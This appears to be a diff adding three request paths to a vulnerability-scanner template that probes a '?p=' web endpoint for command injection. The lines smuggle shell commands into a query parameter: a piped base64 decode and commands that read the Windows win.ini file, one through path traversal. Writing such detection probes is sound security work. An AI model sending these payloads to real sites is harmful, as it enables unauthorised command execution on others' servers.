@@ -1,0 +1,3 @@
+/?p={{post_id}}&0=echo+{{base64(string)}}|base64+-d
+/?p={{post_id}}&0=type+C:\\windows\\win.ini
+/?p={{post_id}}&0=type+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
